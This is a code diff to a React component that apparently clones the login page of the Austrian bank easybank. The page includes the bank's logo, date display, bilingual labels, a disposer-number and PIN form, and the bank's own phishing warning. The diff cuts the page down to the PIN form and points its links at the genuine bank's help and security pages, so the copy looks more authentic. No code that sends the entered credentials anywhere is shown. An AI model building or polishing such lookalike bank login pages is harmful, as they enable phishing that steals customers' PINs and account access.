@@ -10,18 +10,12 @@ const translations: Record<Lang, {
   hilfe: string;
   loginTitle: string;
   loginHilfe: string;
-  loginQuestion: string;
-  tabVerfueger: string;
-  tabApp: string;
   verfuegerLabel: string;
   verfuegerHint: string;
   pinLabel: string;
   pinHint: string;
   loginBtn: string;
   unlockLink: string;
-  appText: string;
-  appInputLabel: string;
-  appBtn: string;
   warnungTitle: string;
   warnungBold: string;
   warnungText: string;
@@ -36,24 +30,20 @@ const translations: Record<Lang, {
   footer: string[];
   tooltipTitle: string;
   tooltipText: string;
+  tabVerfueger: string;
 }> = {
   DE: {
     days: ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"],
     hilfe: "Hilfe",
     loginTitle: "Login mit Zugangsdaten",
     loginHilfe: "Hilfe",
-    loginQuestion: "Wie wollen Sie sich einloggen?",
     tabVerfueger: "Verfüger",
-    tabApp: "Mit der App",
     verfuegerLabel: "Verfügernummer",
     verfuegerHint: "Verfüger ohne führende Nullen!",
     pinLabel: "PIN",
     pinHint: "8 bis 16-stellig",
     loginBtn: "Login",
     unlockLink: "eBanking Zugang entsperren",
-    appText: "Verwenden Sie Ihre für die easybank app registrierte E-Mail oder Ihre Verfügernummer.",
-    appInputLabel: "E-Mail ODER Verfügernummer",
-    appBtn: "Weiter",
     warnungTitle: "Warnung",
     warnungBold: "Achtung vor Phishing",
     warnungText: "Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Konto- und Kreditkarten-Daten einzugeben oder zu bestätigen!",
@@ -74,18 +64,13 @@ const translations: Record<Lang, {
     hilfe: "Help",
     loginTitle: "Login with access data",
     loginHilfe: "Help",
-    loginQuestion: "How do you want to log in?",
     tabVerfueger: "Disposer",
-    tabApp: "With the app",
     verfuegerLabel: "Disposer number",
     verfuegerHint: "Disposer without leading zeros!",
     pinLabel: "PIN",
     pinHint: "8 - 16 characters",
     loginBtn: "Login",
     unlockLink: "Unlock eBanking access",
-    appText: "Use your email registered for the easybank app or your disposer number.",
-    appInputLabel: "Email OR Disposer number",
-    appBtn: "Continue",
     warnungTitle: "Warning",
     warnungBold: "Phishing alert",
     warnungText: "We will never ask you by email or SMS to enter or confirm TANs, account or credit card data!",
@@ -123,10 +108,8 @@ const RedWarningIcon = () => (
 const Easybank = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
-  const [appInput, setAppInput] = useState("");
   const [showPin, setShowPin] = useState(false);
   const [lang, setLang] = useState<Lang>("DE");
-  const [activeTab, setActiveTab] = useState<"verfueger" | "app">("verfueger");
   const [scale, setScale] = useState(1);
   const [showHilfeTooltip, setShowHilfeTooltip] = useState(false);
   const contentRef = useRef<HTMLDivElement>(null);
@@ -172,7 +155,6 @@ const Easybank = () => {
         >
           {/* Header */}
           <header className="bg-white px-4 py-2">
-            {/* Row 1: Hilfe + Sprachauswahl rechts oben */}
             <div className="flex items-center justify-end gap-3">
               <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:underline">
                 {t.hilfe}
@@ -183,12 +165,12 @@ const Easybank = () => {
                     const el = document.getElementById("lang-dropdown");
                     if (el) el.classList.toggle("hidden");
                   }}
-                  className="text-[11px] border border-gray-300 rounded px-2 py-0.5 bg-white text-gray-700 cursor-pointer focus:outline-none flex items-center gap-1"
+                  className="text-[11px] border border-gray-300 px-2 py-0.5 bg-white text-gray-700 cursor-pointer focus:outline-none flex items-center gap-1"
                 >
                   {lang === "DE" ? "deutsch" : "english"}
                   <ChevronDown className="h-3 w-3" />
                 </button>
-                <div id="lang-dropdown" className="hidden absolute right-0 top-full mt-0.5 bg-white border border-gray-300 rounded shadow-md z-50 min-w-[90px]">
+                <div id="lang-dropdown" className="hidden absolute right-0 top-full mt-0.5 bg-white border border-gray-300 shadow-md z-50 min-w-[90px]">
                   {(["DE", "EN"] as Lang[]).map((l) => (
                     <button
                       key={l}
@@ -204,7 +186,6 @@ const Easybank = () => {
                 </div>
               </div>
             </div>
-            {/* Row 2: Logo links + Datum rechts */}
             <div className="flex items-center justify-between">
               <img src={easybankLogo} alt="easybank" className="h-20" />
               <span className="text-[11px] text-black">{dateStr}</span>
@@ -216,7 +197,6 @@ const Easybank = () => {
             {/* Left: Login Card */}
             <div className="w-[370px] flex-shrink-0">
               <div className="border border-[#949494] rounded bg-white">
-                {/* Card header */}
                 <div className="px-4 py-3 bg-[#ecf4dc] flex items-center justify-between rounded-t relative">
                   <h1 className="text-sm font-semibold text-black">{t.loginTitle}</h1>
                   <a
@@ -236,124 +216,67 @@ const Easybank = () => {
                 </div>
 
                 <div className="p-4">
-                  {/* Question */}
-                  <p className="text-xs text-black mb-3">{t.loginQuestion}</p>
+                  {/* Verfüger Tab — zentriert, full-width underline */}
+                  <div className="mb-4">
+                    <div className="text-center py-2 text-xs font-semibold text-[#177991]">
+                      {t.tabVerfueger}
+                    </div>
+                    <div className="h-[2px] bg-[#177991]" />
+                  </div>
 
-                  {/* Tabs */}
-                  <div className="mb-4 border-b border-gray-300">
-                    <div className="flex">
-                      <button
-                        onClick={() => setActiveTab("verfueger")}
-                        className={`px-4 py-2 text-xs font-semibold transition-colors relative ${
-                          activeTab === "verfueger"
-                            ? "text-[#177991]"
-                            : "text-gray-500 hover:text-black"
-                        }`}
-                      >
-                        {t.tabVerfueger}
-                        {activeTab === "verfueger" && (
-                          <span className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#177991]" />
-                        )}
-                      </button>
-                      <button
-                        onClick={() => setActiveTab("app")}
-                        className={`px-4 py-2 text-xs font-semibold transition-colors relative ${
-                          activeTab === "app"
-                            ? "text-[#177991]"
-                            : "text-gray-500 hover:text-black"
-                        }`}
-                      >
-                        {t.tabApp}
-                        {activeTab === "app" && (
-                          <span className="absolute bottom-0 left-0 right-0 h-[2px] bg-[#177991]" />
-                        )}
-                      </button>
+                  {/* Verfügernummer */}
+                  <div className="mb-3 flex items-start gap-2">
+                    <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.verfuegerLabel}</label>
+                    <div className="flex-1">
+                      <input
+                        type="text"
+                        value={verfueger}
+                        onChange={(e) => setVerfueger(e.target.value)}
+                        className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
+                      />
+                      <p className="text-xs text-black mt-1">{t.verfuegerHint}</p>
                     </div>
                   </div>
 
-                  {activeTab === "verfueger" ? (
-                    <div>
-                      {/* Verfügernummer */}
-                      <div className="mb-3 flex items-start gap-2">
-                        <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.verfuegerLabel}</label>
-                        <div className="flex-1">
-                          <input
-                            type="text"
-                            value={verfueger}
-                            onChange={(e) => setVerfueger(e.target.value)}
-                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
-                          />
-                          <p className="text-xs text-black mt-1">{t.verfuegerHint}</p>
-                        </div>
+                  {/* PIN */}
+                  <div className="mb-4 flex items-start gap-2">
+                    <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.pinLabel}</label>
+                    <div className="flex-1">
+                      <div className="relative">
+                        <input
+                          type={showPin ? "text" : "password"}
+                          value={pin}
+                          onChange={(e) => setPin(e.target.value)}
+                          className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
+                        />
+                        {!showPin && (
+                          <button
+                            type="button"
+                            onClick={() => setShowPin(true)}
+                            className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
+                          >
+                            <Eye className="h-5 w-5" />
+                          </button>
+                        )}
                       </div>
-
-                      {/* PIN */}
-                      <div className="mb-4 flex items-start gap-2">
-                        <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.pinLabel}</label>
-                        <div className="flex-1">
-                          <div className="relative">
-                            <input
-                              type={showPin ? "text" : "password"}
-                              value={pin}
-                              onChange={(e) => setPin(e.target.value)}
-                              className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
-                            />
-                            {!showPin && (
-                              <button
-                                type="button"
-                                onClick={() => setShowPin(true)}
-                                className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
-                              >
-                                <Eye className="h-5 w-5" />
-                              </button>
-                            )}
-                          </div>
-                          <p className="text-xs text-black mt-1">{t.pinHint}</p>
-                        </div>
-                      </div>
-
-                      {/* Login button */}
-                      <div className="flex justify-end mb-4">
-                        <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
-                          {t.loginBtn}
-                        </button>
-                      </div>
-
-                      {/* Unlock link */}
-                      <div className="pt-3">
-                        <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold flex items-center gap-1">
-                          <ChevronRight className="h-3 w-3" />
-                          {t.unlockLink}
-                        </a>
-                      </div>
+                      <p className="text-xs text-black mt-1">{t.pinHint}</p>
                     </div>
-                  ) : (
-                    <div>
-                      <p className="text-xs text-black mb-3">{t.appText}</p>
-                      <div className="mb-3 flex items-start gap-2">
-                        <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.appInputLabel}</label>
-                        <div className="flex-1">
-                          <input
-                            type="text"
-                            value={appInput}
-                            onChange={(e) => setAppInput(e.target.value)}
-                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
-                          />
-                        </div>
-                      </div>
-                      <div className="flex justify-end mb-4">
-                        <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-semibold rounded hover:bg-[#126a7d] transition-colors">
-                          {t.appBtn}
-                        </button>
-                      </div>
-                      <div className="pt-3">
-                        <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold flex items-center gap-1">
-                          <ChevronRight className="h-3 w-3" />
-                          {t.unlockLink}
-                        </a>
-                      </div>
-                    </div>
-                  )}
+                  </div>
+
+                  {/* Login button */}
+                  <div className="flex justify-end mb-4">
+                    <button className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
+                      {t.loginBtn}
+                    </button>
+                  </div>
+
+                  {/* Unlock link */}
+                  <div className="pt-3">
+                    <a href="https://hilfe.easybank.at/faq-easybank/haeufig-gestellte-fragen/ebanking-zugang-entsperren" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold flex items-center gap-1">
+                      <ChevronRight className="h-3 w-3" />
+                      {t.unlockLink}
+                    </a>
+                  </div>
                 </div>
               </div>
             </div>
@@ -391,7 +314,7 @@ const Easybank = () => {
                             {t.warnungText}
                           </p>
                         )}
-                        <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-[#4b9920] underline hover:no-underline mt-0">
+                        <a href="https://www.easybank.at/easybank/sicherheitsinformationen" target="_blank" rel="noopener noreferrer" className="text-xs text-[#4b9920] underline hover:no-underline mt-0">
                           {t.warnungLink}
                         </a>
                       </div>
@@ -408,12 +331,12 @@ const Easybank = () => {
                     </div>
                     <div className="h-[2px] bg-[#f6f6f6]" />
                     <div className="p-3 flex-1">
-                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
+                      <a href="https://services.easybank.at/main?formName=unlock-ebanking" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                         <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                         {t.hilfePin}
                       </a>
                       <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
-                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
+                      <a href="https://hilfe.easybank.at/faq-easybank/haeufig-gestellte-fragen/ebanking-zugang-entsperren" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                         <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                         {t.hilfeFaq}
                       </a>
@@ -426,17 +349,17 @@ const Easybank = () => {
                     </div>
                     <div className="h-[2px] bg-[#f6f6f6]" />
                     <div className="p-3 flex-1">
-                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
+                      <a href="https://www.easybank.at/easy/Produkte/Konto/263790/epin.html" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                         <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                         <span className="font-bold">{t.infoDebit}</span>
                       </a>
                       <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
-                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all whitespace-pre-line">
+                      <a href="https://www.easybank.at/de/services/app.html" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all whitespace-pre-line">
                         <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                         {t.infoApp}
                       </a>
                       <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
-                      <a href="#" onClick={(e) => e.preventDefault()} className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
+                      <a href="https://www.watchlist-internet.at/" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                         <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                         {t.infoWatchlist}
                       </a>
@@ -447,12 +370,13 @@ const Easybank = () => {
 
               {/* Banner */}
               <div className="flex-1">
-                <img
-                  src={easybankBanner}
-                  alt="easybank Freunde empfehlen"
-                  className="w-full rounded cursor-pointer"
-                  onClick={() => {}}
-                />
+                <a href="https://ebanking.easybank.at/InternetBanking/info/easybank/bild/2026/EASY26016_login.jpg" target="_blank" rel="noopener noreferrer">
+                  <img
+                    src={easybankBanner}
+                    alt="easybank Freunde empfehlen"
+                    className="w-full rounded cursor-pointer"
+                  />
+                </a>
               </div>
             </div>
           </div>
